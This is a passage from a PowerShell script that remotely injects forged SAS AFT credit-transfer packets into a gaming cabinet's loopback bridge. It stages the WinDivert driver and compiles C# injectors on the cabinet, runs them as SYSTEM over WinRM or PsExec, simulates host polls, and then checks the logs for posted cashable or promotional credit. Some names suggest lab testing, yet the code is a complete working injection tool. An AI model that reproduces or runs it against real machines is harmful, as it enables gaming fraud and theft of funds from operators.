        [int]    $DrainSec,
        [int]    $InjectDelayMs,
        [int]    $EphemWaitSec = 90
    )
    $remoteTemplate = @'
$ErrorActionPreference = "Stop"
$wd  = "__REMOTE_WD__"
$csc = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
$exe = "$wd\WdPollInject.exe"
$out = "$wd\pollaft_out.txt"
Remove-Item $out -Force -ErrorAction SilentlyContinue
"REMOTE_START $(Get-Date -Format o)" | Out-File -FilePath $out -Encoding utf8
try {
    if (-not (Test-Path $exe)) {
        & $csc /nologo /platform:x64 /optimize+ /out:"$exe" "$wd\WdPollInject.cs" 2>&1 | Out-File -FilePath $out -Encoding utf8 -Append
    }
    if (-not (Test-Path $exe)) {
        "COMPILE_FAILED" | Out-File -FilePath $out -Encoding utf8 -Append
    } else {
        $ephem = 0
        $deadline = (Get-Date).AddSeconds(__EPHEMWAIT__)
        do {
            $c = Get-NetTCPConnection -LocalPort __PORT__ -State Established -ErrorAction SilentlyContinue | Select-Object -First 1
            if ($c) { $ephem = [int]$c.RemotePort; break }
            Start-Sleep -Milliseconds 500
        } while ((Get-Date) -lt $deadline)
        if ($ephem -eq 0) {
            "BRIDGE_STATE (no Established on __PORT__):" | Out-File -FilePath $out -Encoding utf8 -Append
            "PROCESSES:" | Out-File -FilePath $out -Encoding utf8 -Append
            Get-Process CommCtrlSAS,GoldClub.Aurum.Services -ErrorAction SilentlyContinue |
                Select-Object Name, Id | Format-Table -AutoSize | Out-String |
                Out-File -FilePath $out -Encoding utf8 -Append
            "TCP_ALL_STATES:" | Out-File -FilePath $out -Encoding utf8 -Append
            Get-NetTCPConnection -LocalPort __PORT__ -ErrorAction SilentlyContinue |
                Select-Object LocalPort, RemotePort, State, OwningProcess |
                Format-Table -AutoSize | Out-String | Out-File -FilePath $out -Encoding utf8 -Append
            "NO_ESTABLISHED___PORT__ (waited __EPHEMWAIT__s for Aurum TCP client on loopback __PORT__; WdPollInject simulates 1B80/1B81 host polls into this flow - it cannot start without an Established CommCtrlSAS->Aurum connection)" | Out-File -FilePath $out -Encoding utf8 -Append
        } else {
            "DISCOVERED_EPHEM=$ephem" | Out-File -FilePath $out -Encoding utf8 -Append
            $prevEap = $ErrorActionPreference
            $ErrorActionPreference = "Continue"
            try {
                & "$exe" pollaft $ephem __SECONDS__ __INTERVAL__ __DRAIN__ "1B81,1B80" __PORT__ "__PAYLOAD__" __INJECTDELAY__ 2>&1 | Out-File -FilePath $out -Encoding utf8 -Append
                "EXITCODE=$LASTEXITCODE" | Out-File -FilePath $out -Encoding utf8 -Append
            }
            finally { $ErrorActionPreference = $prevEap }
        }
    }
}
catch {
    "REMOTE_EXCEPTION: $_" | Out-File -FilePath $out -Encoding utf8 -Append
}
'@
    return $remoteTemplate.
        Replace('__REMOTE_WD__', $RemoteRunPath).
        Replace('__PAYLOAD__', $BridgePayloadHex).
        Replace('__PORT__', [string]$BridgePort).
        Replace('__SECONDS__', [string]$RunSeconds).
        Replace('__INTERVAL__', [string]$IntervalMs).
        Replace('__DRAIN__', [string]$DrainSec).
        Replace('__INJECTDELAY__', [string]$InjectDelayMs).
        Replace('__EPHEMWAIT__', [string]$EphemWaitSec)
}

# ---- remote transport (WinRM preferred / PsExec fallback via LabRemoteTransport.ps1) ----

# ---- normalize amount ----
# -Amount is a raw integer in the EGM's base units ("credits"), placed directly
# into the SAS 0x72 non-restricted (promo) field -- same unit as -AmountCents.
# -Amount takes precedence when supplied; otherwise -AmountCents is used as before.
if ($Amount -gt 0) { $AmountCents = $Amount }
if ($AmountCents -le 0 -or $AmountCents -gt 9999999999) {
    throw "Amount out of range (1..9999999999): $AmountCents"
}

# ---- resolve transfer type (exactly one of -c / -r / -nr; default non-restricted) ----
$typeCount = [int][bool]$Cashable + [int][bool]$Restricted + [int][bool]$NonRestricted
if ($typeCount -gt 1) {
    throw "Specify only one transfer type (-c, -r, or -nr)"
}
if ($Cashable)        { $TransferType = 'cashable' }
elseif ($Restricted)  { $TransferType = 'restricted' }
else                  { $TransferType = 'non-restricted' }

$cashableAmt = 0
$restrictedAmt = 0
$nonRestrictedAmt = 0
switch ($TransferType) {
    'cashable'       { $cashableAmt = $AmountCents }
    'restricted'     { $restrictedAmt = $AmountCents }
    'non-restricted' { $nonRestrictedAmt = $AmountCents }
}

# ---- build the payload ----

$sasPacket = New-AftTransferPacket -Address $SasAddress -CashableAmount $cashableAmt -RestrictedAmount $restrictedAmt -NonRestrictedAmount $nonRestrictedAmt -Asset $AssetNumber -TxnNumber $TransactionNumber
$bridgePayload = New-Object byte[] ($sasPacket.Length + 1)
$bridgePayload[0] = 0x1B
[Array]::Copy($sasPacket, 0, $bridgePayload, 1, $sasPacket.Length)

$sasPacketHex = ConvertTo-Hex $sasPacket
$bridgePayloadHex = ConvertTo-Hex $bridgePayload
# Stable marker: active amount BCD + flags + asset LE (independent of txn id).
$activeAmountRange = switch ($TransferType) {
    'cashable'       { 6..10 }
    'restricted'     { 11..15 }
    default          { 16..20 }
}
$markerBytes = New-Object System.Collections.Generic.List[byte]
$markerBytes.AddRange([byte[]]($sasPacket[$activeAmountRange]))
$markerBytes.AddRange([byte[]]($sasPacket[21..25]))
$markerHex = ConvertTo-Hex ([byte[]]$markerBytes.ToArray())

Write-Host ''
Write-Host '=== WinDivert raw SAS AFT injection ===' -ForegroundColor White
Write-Host "Cabinet : $ComputerName  |  Flow: CommCtrlSAS:$BridgePort -> Aurum:<ephemeral> (server->client)"
Write-Host "Asset   : $AssetNumber   |  Transfer type: $TransferType   |  Amount: $AmountCents (raw SAS units; = `$$([double]$AmountCents / 100.0) if 1 unit = 1 cent)  |  Txn: Test Transaction$TransactionNumber"
Write-Host ''
Write-Host "SAS packet     : $sasPacketHex"
Write-Host "Bridge payload : $bridgePayloadHex   (0x1B + SAS bytes; this is injected)"
Write-Host "Match marker   : $markerHex   ($TransferType amount $AmountCents + asset $AssetNumber)"
Write-Host ''
Write-Host '--- decode ---' -ForegroundColor DarkGray
Write-Host ("  addr={0:X2} cmd=72 len={1:X2} transferCode=00 idx=00 type=00 (active field: {2})" -f $sasPacket[0], $sasPacket[2], $TransferType)
Write-Host ("  cashable={0} restricted={1} nonRestricted={2} (active '{3}' carries raw {4}; = `$$([double]$AmountCents/100.0) if 1 unit = 1 cent)" -f (ConvertTo-Hex ($sasPacket[6..10])), (ConvertTo-Hex ($sasPacket[11..15])), (ConvertTo-Hex ($sasPacket[16..20])), $TransferType, $AmountCents)
Write-Host ("  assetLE={0} (={1}) registrationKey=20x00" -f (ConvertTo-Hex ($sasPacket[22..25])), $AssetNumber)
Write-Host ("  CRC16={0}" -f (ConvertTo-Hex ($sasPacket[($sasPacket.Length-2)..($sasPacket.Length-1)])))
Write-Host ''

$WinDivertDir = Resolve-WinDivertDir -Preferred $WinDivertDir
$dll = Join-Path $WinDivertDir 'WinDivert.dll'
$sys = Join-Path $WinDivertDir 'WinDivert64.sys'
$csSrc = Join-Path $PSScriptRoot 'WdInject.cs'
$pollCsSrc = Join-Path $PSScriptRoot 'WdPollInject.cs'
foreach ($f in @($PsExecPath, $dll, $sys, $csSrc, $pollCsSrc)) {
    if (-not (Test-Path -LiteralPath $f)) { throw "Required file not found: $f" }
}

# Cache the compiled injector per WdInject.cs content hash. The cabinet keeps a stable
# bin-<hash> folder, so csc recompiles ONLY when the source actually changes; unchanged
# runs skip both staging and compilation (and dodge the WinDivert.dll copy-lock, since
# we never re-copy on a cache hit).
$srcHash = (Get-FileHash -LiteralPath $csSrc -Algorithm SHA256).Hash.Substring(0, 12).ToLowerInvariant()
$pollSrcHash = (Get-FileHash -LiteralPath $pollCsSrc -Algorithm SHA256).Hash.Substring(0, 12).ToLowerInvariant()
$remoteBaseDirUnc = "\\$ComputerName\c`$\Windows\Temp\aurumtap"
$remoteBinName = "bin-$srcHash"
$remotePollBinName = "pollinjectbin-$pollSrcHash"
$remoteDirUnc = Join-Path $remoteBaseDirUnc $remoteBinName
$remotePollDirUnc = Join-Path $remoteBaseDirUnc $remotePollBinName
$remoteRunPath = "C:\Windows\Temp\aurumtap\$remoteBinName"
$remotePollRunPath = "C:\Windows\Temp\aurumtap\$remotePollBinName"
$exeUnc = Join-Path $remoteDirUnc 'WdInject.exe'
$pollExeUnc = Join-Path $remotePollDirUnc 'WdPollInject.exe'
$wouldRun = "WinRM first (5985), PsExec (-s) fallback | EncodedCommand -> csc/WdInject.exe $bridgePayloadHex $BridgePort $ObserveMs $AckGraceMs"
$wouldRunPollAft = "WinRM/PsExec -> WdPollInject.exe pollaft (TCP 1B80/1B81 @${WinDivertPollIntervalMs}ms + AFT) ephem discovered live, ${WinDivertPollSeconds}s window"

if ($PSCmdlet.ParameterSetName -eq 'DryRun') {
    Write-Host '[dry-run] Nothing staged or injected.' -ForegroundColor Yellow
    Write-Host 'Remote command that WOULD run (as SYSTEM):' -ForegroundColor DarkGray
    $dryPollMode = if ($NoAutoSasPoll) { 'None' } else { $SasPollMode }
    if ($dryPollMode -ne 'None' -and -not (Test-CabinetSasPollsRecent -Computer $ComputerName -WithinSeconds 12)) {
        if ($dryPollMode -in @('Auto', 'WinDivert')) {
            Write-Host "  Poll path: $wouldRunPollAft" -ForegroundColor DarkGray
            Write-Host "  Cache dir: $remotePollDirUnc  (pollinjectbin-$pollSrcHash)" -ForegroundColor DarkGray
        }
        elseif ($dryPollMode -eq 'Com') {
            Write-Host "  Poll path: COM poll keeper on $SasComPort, then WdInject.exe" -ForegroundColor DarkGray
        }
    }
    else {
        Write-Host "  Poll path: external polls active (or -NoAutoSasPoll) -> WdInject.exe only" -ForegroundColor DarkGray
    }
    Write-Host "  Inject: $wouldRun" -ForegroundColor DarkGray
    Write-Host "  Cache dir: $remoteDirUnc  (bin-$srcHash; stages WinDivert.dll/.sys/.cs + compiles only on a cache miss)" -ForegroundColor DarkGray
    Write-Host ''
    Write-Host '***************************************************************' -ForegroundColor Yellow
    Write-Host '*  THIS WAS A DRY RUN -- NOTHING WAS INJECTED.                *' -ForegroundColor Yellow
    Write-Host '*  No credit was posted to the cabinet.                       *' -ForegroundColor Yellow
    Write-Host '*  To actually inject this AFT packet, re-run with -Send.       *' -ForegroundColor Yellow
    Write-Host '*                                                             *' -ForegroundColor Yellow
    Write-Host '*      .\Invoke-WinDivertAft.ps1 -Send                        *' -ForegroundColor Green
    Write-Host '*                                                             *' -ForegroundColor Yellow
    Write-Host '***************************************************************' -ForegroundColor Yellow
    exit 0
}

# ---- Send: stage + compile + inject + verify ----

$pollKeeperProc = $null
$sasPollModeEffective = if ($NoAutoSasPoll) { 'None' } else { $SasPollMode }
$pollStrategy = Resolve-SasPollStrategy -Computer $ComputerName -Mode $sasPollModeEffective
$usePollAft = $false
$pollCutoffUtc = if ($PollBaselineUtc) { $PollBaselineUtc } else { $null }
if ($pollCutoffUtc) {
    $latestPoll = Get-CabinetLatestPollLine -Computer $ComputerName
    if ($latestPoll) {
        Write-Host "[*] Poll baseline: last sasmsgr line = $latestPoll" -ForegroundColor DarkGray
    }
}

try {
if ($pollStrategy.PollsActive -or (Test-CabinetSasPollsRecent -Computer $ComputerName -SinceUtc $pollCutoffUtc -WithinSeconds 12)) {
    Write-Host '[+] SAS general polls already active on cabinet (external host or prior session).' -ForegroundColor Green
}
elseif ($sasPollModeEffective -ne 'None') {
    if ($pollStrategy.UsePollAft) {
        $usePollAft = $true
        Write-Host '[*] No recent sasmsgr 80/81 — this run will SIMULATE host polls via WinDivert (1B80/1B81 on loopback 31150; no COM/MUX/IGT).' -ForegroundColor Cyan
        Write-Host "    Waiting up to ${WinDivertEphemWaitSec}s for Aurum TCP client on 31150, then poll cadence ${WinDivertPollIntervalMs}ms, AFT @ ${WinDivertPollInjectDelayMs}ms, window ${WinDivertPollSeconds}s" -ForegroundColor DarkGray
    }
    if ($pollStrategy.UseComKeeper -and -not $usePollAft) {
        $pollResult = Start-AutoSasPollKeeperIfNeeded -Computer $ComputerName -Port $SasComPort -WarmupSec $SasPollWarmupSec
        $pollKeeperProc = $pollResult.Process
        if (-not $pollResult.Ok) {
            Write-Host ''
            Write-Host '[!] Aborting inject: live SAS general polls (qGMID1:80/81) are required before AFT credit can post.' -ForegroundColor Red
            Write-Host "    $($pollResult.Message)" -ForegroundColor Yellow
            Write-Host '    Without steady 80/81 polls the packet may reach sasmsgr but Aurum will not commit credit.' -ForegroundColor Yellow
            exit 4
        }
    }
}

if ($autoTransactionStatePath) {
    Write-Host "[*] Auto transaction number: Test Transaction$TransactionNumber (next for ${ComputerName}: $autoTransactionNext)" -ForegroundColor DarkGray
}

$swStage = [System.Diagnostics.Stopwatch]::StartNew()
$cacheHit = Test-Path -LiteralPath $exeUnc
$pollCacheHit = Test-Path -LiteralPath $pollExeUnc
if ($usePollAft) {
    if ($pollCacheHit) {
        Write-Host "[*] Reusing cached WdPollInject.exe on cabinet ($remotePollBinName); skipping stage + compile." -ForegroundColor Cyan
    }
    else {
        New-Item -ItemType Directory -Force -Path $remotePollDirUnc | Out-Null
        Copy-Item -LiteralPath $dll -Destination $remotePollDirUnc -Force
        Copy-Item -LiteralPath $sys -Destination $remotePollDirUnc -Force
        Copy-Item -LiteralPath $pollCsSrc -Destination $remotePollDirUnc -Force
        Write-Host "[*] Cache miss ($remotePollBinName): staged WinDivert + WdPollInject.cs for TCP poll sim." -ForegroundColor Cyan
    }
}
if (-not $usePollAft) {
    if ($cacheHit) {
        Write-Host "[*] Reusing cached WdInject.exe on cabinet (bin-$srcHash); skipping stage + compile." -ForegroundColor Cyan
    }
    else {
        New-Item -ItemType Directory -Force -Path $remoteDirUnc | Out-Null
        Copy-Item -LiteralPath $dll -Destination $remoteDirUnc -Force
        Copy-Item -LiteralPath $sys -Destination $remoteDirUnc -Force
        Copy-Item -LiteralPath $csSrc -Destination $remoteDirUnc -Force
        Write-Host "[*] Cache miss (bin-$srcHash): staged WinDivert.dll, WinDivert64.sys, WdInject.cs to $remoteDirUnc (compiles WdInject.exe once)." -ForegroundColor Cyan
    }
}
$swStage.Stop()
$stageElapsed = $swStage.Elapsed

$outUnc = if ($usePollAft) { Join-Path $remotePollDirUnc 'pollaft_out.txt' } else { Join-Path $remoteDirUnc 'inject_out.txt' }

# Remote script compiles ONLY when WdInject.exe is absent (cache miss); otherwise it
# runs the cached exe directly. Any change to WdInject.cs changes $srcHash -> new
# bin-<hash> folder -> a one-time recompile, so the cache can never go stale.
$remoteTemplate = @'
$ErrorActionPreference = "Stop"
$wd  = "__REMOTE_WD__"
$csc = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
$exe = "$wd\WdInject.exe"
$out = "$wd\inject_out.txt"
Remove-Item $out -Force -ErrorAction SilentlyContinue
try {
    if (-not (Test-Path $exe)) {
        & $csc /nologo /platform:x64 /optimize+ /out:"$exe" "$wd\WdInject.cs" 2>&1 | Out-File -FilePath $out -Encoding utf8 -Append
    }
    if (-not (Test-Path $exe)) {
        "COMPILE_FAILED" | Out-File -FilePath $out -Encoding utf8 -Append
    } else {
        $svcConfig = (& sc.exe qc WinDivert 2>&1 | Out-String)
        if ($svcConfig -match 'START_TYPE\s+:\s+4\s+DISABLED') {
            "PRE_OPEN_WARN: WinDivert service is disabled before open; not repairing/deleting per-run. Trying WinDivertOpen." | Out-File -FilePath $out -Encoding utf8 -Append
            $svcConfig | Out-File -FilePath $out -Encoding utf8 -Append
        }
        elseif ($svcConfig -match 'marked for deletion|1072') {
            "PRE_OPEN_WARN: WinDivert service reports marked for deletion before open. Trying WinDivertOpen; actual open result decides." | Out-File -FilePath $out -Encoding utf8 -Append
            $svcConfig | Out-File -FilePath $out -Encoding utf8 -Append
        }
        $prevEap = $ErrorActionPreference
        $ErrorActionPreference = "Continue"
        try {
            & "$exe" __PAYLOAD__ __PORT__ __OBSERVE__ __ACKGRACE__ 2>&1 | Out-File -FilePath $out -Encoding utf8 -Append
            "EXITCODE=$LASTEXITCODE" | Out-File -FilePath $out -Encoding utf8 -Append
        }
        finally {
            $ErrorActionPreference = $prevEap
        }
    }
}
catch {
    "REMOTE_EXCEPTION: $_" | Out-File -FilePath $out -Encoding utf8 -Append
}
finally {
    # Do NOT sc-stop / sc-delete WinDivert here. WinDivert installs the kernel-driver
    # service on open and unloads it when the last handle closes (WdInject.exe closes
    # on every exit path, including Ctrl-C/ProcessExit). Deleting a service whose driver
    # is still referenced is exactly what produces STOP_PENDING + "marked for deletion"
    # (Windows cannot force-unload a referenced kernel driver). We leave the service
    # registered as demand-start: idle when unused, instantly reusable next run, and a
    # crashed/orphaned run leaves a REUSABLE driver instead of a wedged one. Use
    # Invoke-WinDivertAft.ps1 -RemoveDriver for an explicit, safe teardown.
}
'@
$remoteScript = $remoteTemplate.Replace('__PAYLOAD__', $bridgePayloadHex).Replace('__PORT__', [string]$BridgePort).Replace('__OBSERVE__', [string]$ObserveMs).Replace('__ACKGRACE__', [string]$AckGraceMs).Replace('__REMOTE_WD__', $remoteRunPath)
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($remoteScript))

$pollAftScript = New-WinDivertPollAftRemoteScript -RemoteRunPath $remotePollRunPath -BridgePayloadHex $bridgePayloadHex `
    -BridgePort $BridgePort -RunSeconds $WinDivertPollSeconds -IntervalMs $WinDivertPollIntervalMs `
    -DrainSec $WinDivertPollDrainSec -InjectDelayMs $WinDivertPollInjectDelayMs -EphemWaitSec $WinDivertEphemWaitSec
$encPollAft = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($pollAftScript))

# ---- transport selection (WinRM preferred / PsExec fallback) ----
$transportStatePath = Join-Path $PSScriptRoot '.aft-windivert-transport.json'

function Get-TransportState {
    param([string] $Path)
    $state = @{}
    if (Test-Path -LiteralPath $Path) {
        try {
            $json = Get-Content -LiteralPath $Path -Raw | ConvertFrom-Json
            foreach ($p in $json.PSObject.Properties) {
                $winrm = $false
                if ($p.Value -and $p.Value.PSObject.Properties['winrm']) { $winrm = [bool]$p.Value.winrm }
                $state[$p.Name] = @{ winrm = $winrm }
            }
        }
        catch {
            $state = @{}
        }
    }
    return $state
}

function Save-TransportState {
    param([hashtable] $State, [string] $Path)
    try {
        $obj = @{}
        foreach ($k in $State.Keys) {
            $obj[$k] = @{ winrm = [bool]$State[$k].winrm }
        }
        $obj | ConvertTo-Json | Set-Content -LiteralPath $Path -Encoding UTF8
    }
    catch {
        Write-Host "[!] Could not save transport state: $_" -ForegroundColor Yellow
    }
}

function Test-WdInjectOpenOk {
    param([string] $Output)
    return [bool]($Output -match '(?m)^OPEN ok\s*$')
}

function Get-WdInjectFatalDriverFailure {
    param([string] $Output)

    $openOk = Test-WdInjectOpenOk -Output $Output
    if ($Output -match 'WinDivertOpen FAILED GetLastError=1058') {
        return 'WinDivertOpen failed with Windows error 1058 (driver service disabled or cannot be started). Fix the WinDivert service state, then retry.'
    }

    # Pre-open service noise is only fatal if WinDivertOpen never succeeded. A stale
    # "marked for deletion" / STOP_PENDING line followed by OPEN ok means the driver
    # was usable for this run; let packet timeout/ingestion handling decide instead.
    if (-not $openOk -and $Output -match 'marked for deletion|STOP_PENDING') {
        return 'WinDivert driver service appears stuck before open (STOP_PENDING / marked for deletion) and WinDivertOpen did not succeed. Reboot the cabinet to clear the kernel driver service, then retry.'
    }

    return $null
}

# 4a. Load persisted state and resolve transport order (always probe WinRM first).
$transportState = Get-TransportState -Path $transportStatePath
$transportPlan = Get-LabRemoteTransportPlan -ComputerName $ComputerName -Credential $Credential `
    -CredentialFromLab:$script:CredentialFromLab
$scheduleWinRmEnable = $transportPlan.ScheduleWinRmEnable
$transportOrder = @($transportPlan.TransportOrder)

if ($transportPlan.WinRmPreferredThisRun) {
    if (-not $transportState.ContainsKey($ComputerName)) { $transportState[$ComputerName] = @{ winrm = $false } }
    if (-not $transportState[$ComputerName].winrm) {
        $transportState[$ComputerName].winrm = $true
        Save-TransportState -State $transportState -Path $transportStatePath
    }
}

$ingestLine = $null
$creditEvidence = @()
$attempt = 0
$lastInjectOut = ''
$injectElapsed = [TimeSpan]::Zero
$ingestElapsed = [TimeSpan]::Zero
$creditElapsed = [TimeSpan]::Zero
$fatalInjectFailure = $null

while ($attempt -lt $MaxRetries -and -not $ingestLine) {
    $attempt++
    $attemptPollAft = $usePollAft
    $attemptEnc = if ($attemptPollAft) { $encPollAft } else { $enc }
    $attemptOutUnc = if ($attemptPollAft) { Join-Path $remotePollDirUnc 'pollaft_out.txt' } else { Join-Path $remoteDirUnc 'inject_out.txt' }
    $injectLabel = if ($attemptPollAft) { 'WdPollInject.exe (pollaft)' } else { 'WdInject.exe' }

    Write-Host ''
    Write-Host "[*] Live injection attempt $attempt of $MaxRetries ($injectLabel)..." -ForegroundColor Cyan
    $sendStartUtc = (Get-Date).ToUniversalTime()
    Remove-Item -LiteralPath $attemptOutUnc -Force -ErrorAction SilentlyContinue

    if (-not $attemptPollAft -and -not (Test-Path -LiteralPath $exeUnc)) {
        if (-not (Test-Path -LiteralPath $remoteDirUnc)) {
            New-Item -ItemType Directory -Force -Path $remoteDirUnc | Out-Null
        }
        Copy-Item -LiteralPath $dll -Destination $remoteDirUnc -Force -ErrorAction SilentlyContinue
        Copy-Item -LiteralPath $sys -Destination $remoteDirUnc -Force -ErrorAction SilentlyContinue
        Copy-Item -LiteralPath $csSrc -Destination $remoteDirUnc -Force -ErrorAction SilentlyContinue
    }

    $usedTransport = $null
    $swInject = [System.Diagnostics.Stopwatch]::StartNew()
    $transportLog = Join-Path $env:TEMP ("wdinject_{0}_{1}.log" -f $ComputerName.Replace('.','_'), (Get-Date -Format 'yyyyMMddHHmmssfff'))
    $winRmTimeoutMs = if ($attemptPollAft) {
        ([Math]::Max($WinDivertEphemWaitSec + $WinDivertPollSeconds + $WinDivertPollDrainSec + 30, 120)) * 1000
    } else { $null }
    $psexecTimeoutSec = if ($attemptPollAft) {
        [Math]::Max($WinDivertEphemWaitSec + $WinDivertPollSeconds + $WinDivertPollDrainSec + 20, 90)
    } else { $null }
    $usedTransport = Invoke-LabRemoteEncodedWithFallback -TransportOrder $transportOrder `
        -Computer $ComputerName -Enc $attemptEnc -LogPath $transportLog -Credential $Credential `
        -PsExecPath $PsExecPath -PsExecAuthArgs $script:PsExecAuthArgs `
        -WinRmOperationTimeoutMs $winRmTimeoutMs -PsExecTimeoutSec $psexecTimeoutSec
    $swInject.Stop()
    $injectElapsed = $swInject.Elapsed
    if (-not $usedTransport) {
        Write-Host '[!] No transport succeeded for this attempt. Retrying...' -ForegroundColor Yellow
        if ($attemptPollAft -and $sasPollModeEffective -eq 'Auto' -and $pollStrategy.UseComKeeper) {
            Write-Host '[*] Auto fallback: next attempt will use COM poll keeper + WdInject.exe.' -ForegroundColor Yellow
            $usePollAft = $false
        }
        continue
    }

    $lastInjectOut = ''
    $pollAftWaitSec = [Math]::Max($WinDivertEphemWaitSec + $WinDivertPollSeconds + $WinDivertPollDrainSec + 15, 60)
    $waitIters = if ($attemptPollAft) {
        [Math]::Ceiling($pollAftWaitSec / 0.5)
    } else { 8 }
    for ($i = 0; $i -lt $waitIters; $i++) {
        if (Test-Path -LiteralPath $attemptOutUnc) {
            $lastInjectOut = (Get-Content -LiteralPath $attemptOutUnc -Raw)
            if ($lastInjectOut -match 'EXITCODE=|COMPILE_FAILED|REMOTE_EXCEPTION|NO_ESTABLISHED|AFT_INJECTED|DONE mode=pollaft') { break }
        }
        Start-Sleep -Milliseconds $(if ($attemptPollAft) { 500 } else { 150 })
    }
    if ($lastInjectOut) {
        Write-Host "--- $injectLabel output ---" -ForegroundColor DarkGray
        Write-Host $lastInjectOut
    }
    else {
        Write-Host "[!] No output file produced at $attemptOutUnc." -ForegroundColor Yellow
    }

    $openOk = if ($attemptPollAft) { Test-WdPollInjectOpenOk -Output $lastInjectOut } else { Test-WdInjectOpenOk -Output $lastInjectOut }
    $aftSent = if ($attemptPollAft) { Test-WdPollAftInjected -Output $lastInjectOut } else { $lastInjectOut -match 'INJECTED seq=' }

    if ($attemptPollAft -and ($lastInjectOut -match 'NO_ESTABLISHED|NO_TCP_TRAFFIC' -or (-not $openOk) -or (-not $aftSent))) {
        Write-Host '[!] WinDivert TCP poll+AFT session did not complete cleanly.' -ForegroundColor Yellow
        if ($lastInjectOut -match 'NO_ESTABLISHED') {
            Write-Host '    Poll sim needs CommCtrlSAS:31150 <-> Aurum:<ephemeral> in ESTABLISHED state (we originate 1B80/1B81 into that flow; no external IGT/COM host required).' -ForegroundColor Yellow
            Write-Host '    CommCtrlSAS/Aurum may be running while the bridge TCP is still down (e.g. mandatory service offline / comm lock). Wait for communications unlock — do not restart services from this tool.' -ForegroundColor Yellow
        }
        elseif ($lastInjectOut -match 'DONE mode=pollaft.*\bs2c=0\b.*\bc2s=0\b' -and $openOk) {
            Write-Host '    Bridge TCP was ESTABLISHED but completely silent (zero packets both directions). WdPollInject needs at least one packet to learn IP/TCP headers before it can inject polls.' -ForegroundColor Yellow
            Write-Host '    Wait for natural 80/81 traffic or comm unlock, then retry.' -ForegroundColor Yellow
        }
        if ($attempt -lt $MaxRetries -and $PollAftRetryDelaySec -gt 0) {
            Write-Host "[*] Waiting ${PollAftRetryDelaySec}s for SAS bridge to recover before next attempt..." -ForegroundColor DarkGray
            Start-Sleep -Seconds $PollAftRetryDelaySec
        }
        if ($sasPollModeEffective -eq 'Auto' -and $pollStrategy.UseComKeeper) {
            Write-Host '[*] Auto fallback: starting COM poll keeper and switching to WdInject.exe for next attempt.' -ForegroundColor Cyan
            $usePollAft = $false
            $pollResult = Start-AutoSasPollKeeperIfNeeded -Computer $ComputerName -Port $SasComPort -WarmupSec $SasPollWarmupSec
            $pollKeeperProc = $pollResult.Process
            if (-not $pollResult.Ok) {
                Write-Host "    COM fallback failed: $($pollResult.Message)" -ForegroundColor Yellow
            }
            continue
        }
    }

    $driverFailure = Get-WdInjectFatalDriverFailure -Output $lastInjectOut
    if ($driverFailure) {
        $fatalInjectFailure = $driverFailure
        Write-Host "[!] $fatalInjectFailure" -ForegroundColor Red
        break
    }

    # 4e. WinDivert needs an elevated token. If WinRM ran but the driver did not open,
    # retry immediately via PsExec in this same attempt before polling logs.
    if ($usedTransport -eq 'winrm' -and -not $attemptPollAft) {
        $openOk = (Test-WdInjectOpenOk -Output $lastInjectOut) -and ($lastInjectOut -notmatch 'WinDivertOpen FAILED')
        if (-not $openOk) {
            Write-Host '[!] WinRM session could not load WinDivert (no "OPEN ok"); retrying via PsExec now...' -ForegroundColor Yellow
            Remove-Item -LiteralPath $attemptOutUnc -Force -ErrorAction SilentlyContinue
            $transportLog = Join-Path $env:TEMP ("wdinject_psexec_retry_{0}.log" -f $attempt)
            $usedTransport = Invoke-LabRemoteEncodedWithFallback -TransportOrder @('psexec') `
                -Computer $ComputerName -Enc $attemptEnc -LogPath $transportLog -Credential $Credential `
                -PsExecPath $PsExecPath -PsExecAuthArgs $script:PsExecAuthArgs
            $lastInjectOut = ''
            for ($i = 0; $i -lt 8; $i++) {
                if (Test-Path -LiteralPath $attemptOutUnc) {
                    $lastInjectOut = (Get-Content -LiteralPath $attemptOutUnc -Raw)
                    if ($lastInjectOut -match 'EXITCODE=|COMPILE_FAILED|REMOTE_EXCEPTION') { break }
                }
                Start-Sleep -Milliseconds 150
            }
            if ($lastInjectOut) {
                Write-Host "--- $injectLabel output (PsExec retry) ---" -ForegroundColor DarkGray
                Write-Host $lastInjectOut
            }
            $transportOrder = @('psexec')
        }
    }

    Write-Host '[*] Polling sasmsgr log for ingestion (up to 4s)...' -ForegroundColor Cyan
    $swIngest = [System.Diagnostics.Stopwatch]::StartNew()
    $ingestDeadline = (Get-Date).AddSeconds(4)
    do {
        Start-Sleep -Milliseconds 400
        $ingestLine = Test-SasMessengerIngested -Computer $ComputerName -PacketHex $sasPacketHex -SinceUtc $sendStartUtc
    } while (-not $ingestLine -and (Get-Date) -lt $ingestDeadline)
    $swIngest.Stop()
    $ingestElapsed = $swIngest.Elapsed
    if ($ingestLine) {
        Write-Host '[+] sasmsgr INGESTED the injected 0x72 command:' -ForegroundColor Green
        Write-Host "    $ingestLine" -ForegroundColor Green
        if ($ingestLine -match '^(\S+)') {
            $ingestUtc = Get-LogLineUtc $Matches[1]
        }
        else {
            $ingestUtc = $sendStartUtc
        }
        # Credit events usually post within ~1s; large cashable transfers can take ~10s.
        $swCredit = [System.Diagnostics.Stopwatch]::StartNew()
        $creditDeadline = (Get-Date).AddSeconds(15)
        do {
            Start-Sleep -Milliseconds 500
            $creditEvidence = Find-CreditEvidence -Computer $ComputerName -StartUtc $ingestUtc -EndUtc $ingestUtc.AddSeconds(45) -Amount $AmountCents -TransferType $TransferType
        } while ((@($creditEvidence).Count -eq 0) -and (Get-Date) -lt $creditDeadline)
        $swCredit.Stop()
        $creditElapsed = $swCredit.Elapsed
    }
    else {
        Write-Host '[!] sasmsgr did not log our 0x72 within window (likely SEQ race). Retrying...' -ForegroundColor Yellow
        if ($attemptPollAft -and $sasPollModeEffective -eq 'Auto' -and $pollStrategy.UseComKeeper -and -not $pollKeeperProc) {
            Write-Host '[*] Auto fallback: COM poll keeper + WdInject.exe on next attempt.' -ForegroundColor Cyan
            $usePollAft = $false
            $pollResult = Start-AutoSasPollKeeperIfNeeded -Computer $ComputerName -Port $SasComPort -WarmupSec $SasPollWarmupSec
            $pollKeeperProc = $pollResult.Process
        }
    }
}

# Now that the injection PsExec is done, kick off the background WinRM enable (if we
# decided to this run). Doing it here -- not earlier -- avoids two PsExec sessions
# fighting over the cabinet's PSEXESVC during the critical inject.
if ($scheduleWinRmEnable) {
    if (Start-LabRemoteWinRmEnableAsync -Computer $ComputerName -PsExecPath $PsExecPath -PsExecAuthArgs $script:PsExecAuthArgs) {
        Write-Host ''
